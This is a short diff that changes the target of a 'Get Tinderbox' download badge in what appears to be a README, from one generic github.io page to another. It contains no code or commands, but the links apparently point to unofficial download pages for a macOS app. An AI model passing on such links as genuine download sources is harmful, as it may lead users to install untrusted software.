@@ -7,7 +7,7 @@
 <br>
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/tinderbox">  
+<a href="https://osx-app.github.io/.github/tinderbox">  
 <img src="https://img.shields.io/badge/⬇️_Get_Tinderbox-blue?style=for-the-badge&logo=apple" alt="Get Tinderbox">  
 </a>  
 </div>  
